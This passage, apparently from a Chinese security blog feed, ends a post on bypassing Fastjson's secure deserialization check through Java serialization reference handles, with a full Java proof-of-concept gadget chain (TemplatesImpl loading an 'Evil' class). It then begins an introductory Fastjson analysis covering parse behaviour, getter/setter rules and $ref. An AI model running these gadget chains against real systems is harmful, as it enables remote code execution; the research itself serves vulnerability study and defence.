readHandle(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">            <span class="keyword">return</span> readProxyDesc(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">            <span class="keyword">return</span> readNonProxyDesc(unshared);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上文提到了不会调用readClassDesc方法的分值重只剩下REFERENCE类型，那么如何在JSONArray&#x2F;JSONObject对象反序列化恢复对象时，让恶意类成为引用REFERENCE类型，从而绕过resolveClass的检查呢？</p><p>在java.io.ObjectOutputStream#writeObject0方法中存在一个判断，当再次写入同一对象时，如果在handles这个哈希表中查到了映射，就会通过writeHandle方法将重复对象以REFERENCE类型写入，因此向List、Set及Map类型中添加同样对象时即可成功利用。</p><p><img src="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1735132368777-6cb78e90-b9a4-45f1-87e1-1d7694d78079.png"></p><p><img src="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1735132412140-688706d0-2efb-49da-8d1e-e21edb9c043c.png"></p><p>Payload构建思路如下：</p><ol><li>序列化时，先将templates加入ArrayList，后续在JSONArray中再次序列化TemplatesImpl时，由于在handles这个哈希表中查到了映射，后续则会以引用形式输出。</li><li>反序列化时，ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray&#x2F;JSONObject对象，会触发JSONArray&#x2F;JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray&#x2F;JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonSelfUnserAll</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">badAttributeValueExpExceptionPoc</span> <span class="operator">=</span> getBadAttributeValueExpExceptionPoc();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">xStringPoc</span> <span class="operator">=</span> getXStringPoc();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreeCustomObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(xStringPoc);</span><br><span class="line"><span class="comment">//            System.out.println(Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));</span></span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getBadAttributeValueExpExceptionPoc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> getTemplatesImpl();</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(templatesImpl, badAttributeValueExpException);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">getXStringPoc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(getTemplatesImpl());</span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>, jsonArray);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>, jsonArray);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map2, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(getTemplatesImpl(), xString);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">getTemplatesImpl</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(Evil.class.getName());</span><br><span class="line">        <span class="type">byte</span>[] code = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Evil&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在JSONArray中再次序列化TemplatesImpl时，由于在handles这个哈希表中查到了映射，后续则会调用writeHandle方法以引用形式输出。</p><p><img src="/2024/12/25/Fastjson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1735134046192-e6a0fd6b-e7a2-4c48-abb0-31bdeb65fe75.png"></p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>上文提到了是在先触发<strong>不安全的ObjectInputStream#readObject方法</strong>，那如果此时的反序列化的入口为一个继承ObjectInputStream的类并重写resolveClass方法的自定义类时，那该如何进行绕过呢？</p><p>思路也很简单，直接利用未被列入黑名单的二次反序列化利用类即可绕过。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">FastJson与原生反序列化</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJson与原生反序列化(二)</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> Fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cursory Analysis Of Fastjson</title>
      <link href="/2024/12/24/Cursory-Analysis-Of-Fastjson/"/>
      <url>/2024/12/24/Cursory-Analysis-Of-Fastjson/</url>
      
        <content type="html"><![CDATA[<blockquote><p><font style="color:#000000;">FastJson是一个由阿里巴巴开发的高性能Java语言JSON处理库。它以快速高效著称，在解析和序列化JSON数据时速度优势明显，能够快速处理大量JSON数据。其API简单易用，通过简单的方法如JSON.toJSONString()和JSON.parseObject()等就能轻松实现Java对象和JSON字符串之间的相互转换。它支持多种Java数据类型，包括基本类型、包装类型、数组、集合和自定义对象，对于复杂嵌套结构也能很好地处理，并且它有灵活的配置选项，可定制序列化和反序列化行为。</font></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><font style="color:#000000;">在攻防实战或漏洞挖掘期间，会经常遇见使用了该组件的系统，针对不同版本、不同环境的利用思路会有些不同，本文简单总结了FastJSON各版本的漏洞分析及利用情况。</font></p><h2 id="基本概况"><a href="#基本概况" class="headerlink" title="基本概况"></a>基本概况</h2><h3 id="Object2JSON"><a href="#Object2JSON" class="headerlink" title="Object2JSON"></a>Object2JSON</h3><p><font style="color:#000000;">将类序列化为JSON数据最常用的方法为JSON#toJSONString ，该方法有若干重载方法，带有不同的参数，其中常用的包括以下几个。</font></p><ol><li><font style="color:#000000;">序列化特性（</font><font style="color:#000000;background-color:#ffffff;">SerializerFeature</font><font style="color:#000000;">）：com.alibaba.fastjson.serializer.SerializerFeature，可以通过设置多个特性到FastjsonConfig中全局使用，也可以在使用具体方法中指定特性</font></li><li><font style="color:#000000;">序列化过滤器（</font><font style="color:#000000;background-color:#ffffff;">SerializeFilter</font><font style="color:#000000;">）：com.alibaba.fastjson.serializer.SerializeFilter，这是一个接口，通过配置它的子接口或者实现类就可以以扩展编程的方式实现定制序列化</font></li><li><font style="color:#000000;">序列化时的配置（</font><font style="color:#000000;background-color:#ffffff;">SerializeConfig</font><font style="color:#000000;">）：com.alibaba.fastjson.serializer.SerializeConfig ，可以添加特点类型自定义的序列化配置</font></li></ol><h3 id="JSON2Object"><a href="#JSON2Object" class="headerlink" title="JSON2Object"></a>JSON2Object</h3><p><font style="color:#000000;">将JSON数据反序列化时常用的方法为JSON#parse、JSON#parseObject、JSON#parseArray，这三个方法也均包含若干重载方法，带有不同参数：</font></p><ol><li><font style="color:#000000;">反序列化特性（Feature）：com.alibaba.fastjson.parser.Feature</font></li><li><font style="color:#000000;">类的类型（Type）：java.lang.reflect.Type，用来执行反序列化类的类型</font></li><li><font style="color:#000000;">处理泛型反序列化（TypeReference）：com.alibaba.fastjson.TypeReference</font></li><li><font style="color:#000000;">编程扩展定制反序列化（ParseProcess）：com.alibaba.fastjson.parser.deserializer.ParseProcess，例如ExtraProcessor用于处理多余的字段，ExtraTypeProvider用于处理多余字段时提供类型信息</font></li></ol><h3 id="parse-parseObject"><a href="#parse-parseObject" class="headerlink" title="parse&amp;parseObject"></a>parse&amp;parseObject</h3><p><font style="color:#000000;">在FastJson中，parse方法和parseObject方法都可以用来将JSON字符串反序列化成Java对象，parseObject方法相较于parse方法只是做了一层封装，判断返回的对象是否为JSONObject实例并强转为JSONObject类。</font></p><p><font style="color:#000000;">所以进行反序列化时的细节区别在于，</font><strong><font style="color:#000000;">parse方法会识别并调用目标类的setter方法及某些特定条件的getter方法（返回值类型继承自Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong的getter方法）</font></strong><font style="color:#000000;">，而parseObject方法由于多执行了JSON.toJSON(obj)，所以在处理过程中</font><strong><font style="color:#000000;">parseObject方法会调用反序列化目标类的所有setter和getter方法</font></strong><font style="color:#000000;">。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title function_">parseObject</span><span class="params">(String text)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> parse(text);</span><br><span class="line">    <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> JSONObject) &#123;</span><br><span class="line">        <span class="keyword">return</span> (JSONObject) obj;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> (JSONObject) JSON.toJSON(obj);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">使用JSON.parse(jsonString)&#x2F;JSON.parseObject(jsonString)方法和JSON.parseObject(jsonString, Target.class)方法时，两者调用链一致。</font></p><ul><li><font style="color:#000000;">前者会在jsonString中解析字符串获取@type指定的类</font></li></ul><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734677323298-afec7a2d-361a-49df-bb36-744a2f5d38c0.png"></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734678056721-e6f2827c-b967-4208-8433-bb250afbb990.png"></p><ul><li><font style="color:#000000;">后者则会直接使用参数中的class</font></li></ul><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1734678597071-144cf5a4-7c60-4d2d-aa37-06b2cf286e83.png"></p><h3 id="getter-setter"><a href="#getter-setter" class="headerlink" title="getter&amp;setter"></a>getter&amp;setter</h3><p><font style="color:#000000;">Fastjson在创建类实例时，会通过反射调用类中符合条件的getter&#x2F;setter方法。</font></p><p><font style="color:#000000;">其中getter方法需满足如下要求：</font><strong><font style="color:#000000;">方法名长于4、不是静态方法、以get开头且第4位是大写字母、方法不能有参数传入、继承自Collection|Map|AtomicBoolean|AtomicInteger|AtomicLong、此属性没有setter方法</font></strong><font style="color:#000000;">。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Method method : clazz.getMethods()) &#123; <span class="comment">// getter methods</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (method.getParameterTypes().length != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Collection.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">            || Map.class.isAssignableFrom(method.getReturnType()) <span class="comment">//</span></span><br><span class="line">            || AtomicBoolean.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">            || AtomicInteger.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">            || AtomicLong.class == method.getReturnType() <span class="comment">//</span></span><br><span class="line">        ) &#123;</span><br><span class="line">            ...</span><br><span class="line">            </span><br><span class="line">            add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, <span class="literal">null</span>, clazz, type, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, annotation, <span class="literal">null</span>, <span class="literal">null</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">setter方法需满足如下条件：</font><strong><font style="color:#000000;">方法名长于4，以set开头且第4位是大写字母、非静态方法、返回类型为void或当前类、参数个数为1个</font></strong><font style="color:#000000;">。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> <span class="number">0</span>, serialzeFeatures = <span class="number">0</span>, parserFeatures = <span class="number">0</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">methodName</span> <span class="operator">=</span> method.getName();</span><br><span class="line">    <span class="keyword">if</span> (methodName.length() &lt; <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Modifier.isStatic(method.getModifiers())) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// support builder set</span></span><br><span class="line">    <span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">    <span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!methodName.startsWith(<span class="string">&quot;set&quot;</span>)) &#123; <span class="comment">// TODO &quot;set&quot;的判断放在 JSONField 注解后面，意思是允许非 setter 方法标记 JSONField 注解？</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">    add(fieldList, <span class="keyword">new</span> <span class="title class_">FieldInfo</span>(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, <span class="literal">null</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="parse突破特殊getter调用限制"><a href="#parse突破特殊getter调用限制" class="headerlink" title="parse突破特殊getter调用限制"></a>parse突破特殊getter调用限制</h3><h4 id="ref"><a href="#ref" class="headerlink" title="$ref"></a>$ref</h4><p><font style="color:#000000;">$ref是fastjson里的引用，用于引用之前出现的对象。由于调用getter方法时存在限制的，对于一般的不满足条件的getter方法，</font><strong><font style="color:#000000;">当fastjson ＞&#x3D; 1.2.36时，可以使用$ref的方式来调用任意的getter</font></strong><font style="color:#000000;">。</font></p><table><thead><tr><th align="center"><font style="color:#000000;">语法</font></th><th align="center"><font style="color:#000000;">描述</font></th></tr></thead><tbody><tr><td align="center"><font style="color:#000000;">{“$ref”:”$”}</font></td><td align="center"><font style="color:#000000;">根对象</font></td></tr><tr><td align="center"><font style="color:#000000;">{“$ref”:”@”}</font></td><td align="center"><font style="color:#000000;">当前对象，即自引用</font></td></tr><tr><td align="center"><font style="color:#000000;">{“$ref”:”..”}</font></td><td align="center"><font style="color:#000000;">父对象</font></td></tr><tr><td align="center"><font style="color:#000000;">{“$ref”:”..&#x2F;..”}</font></td><td align="center"><font style="color:#000000;">引用父对象的父对象</font></td></tr><tr><td align="center"><font style="color:#000000;">{“$ref”:”</font><font style="color:#000000;">$.children.0</font><font style="color:#000000;">“}</font></td><td align="center"><font style="color:#000000;">基于路径的引用，</font><font style="color:#000000;">相当于 root.getChildren().get(0)</font></td></tr></tbody></table><p><font style="color:#000000;">在示例代码中，利用parse来反序列化数据时并没有触发Ref类中的getter方法，但是利用$ref来引用之前出现的对象后，成功触发了指定的getName方法。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Ref</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Ref</span>();</span><br><span class="line">        ref.setId(<span class="string">&quot;H3rmesk1t&quot;</span>);</span><br><span class="line">        ref.setName(<span class="string">&quot;AlphaG0&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Object to JSON...&quot;</span>);</span><br><span class="line">        System.out.println(JSON.toJSONString(ref, SerializerFeature.WriteClassName));</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.example.fastjson.Ref\&quot;,\&quot;id\&quot;:\&quot;H3rmesk1t\&quot;,\&quot;name\&quot;:\&quot;AlphaG0\&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parse...&quot;</span>);</span><br><span class="line">        JSON.parse(json);</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parseObject...&quot;</span>);</span><br><span class="line">        JSON.parseObject(json);</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonRef</span> <span class="operator">=</span> <span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;org.example.fastjson.Ref\&quot;,\&quot;id\&quot;:\&quot;H3rmesk1t\&quot;,\&quot;name\&quot;:\&quot;AlphaG0\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].name\&quot;&#125;]&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;JSON to Obejct With parse and ref...&quot;</span>);</span><br><span class="line">        JSON.parse(jsonRef);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Ref</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(id);</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(String id)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(name);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735010751608-3197b2fc-5e3b-44ab-841c-2b038797f199.png"></p><p><font 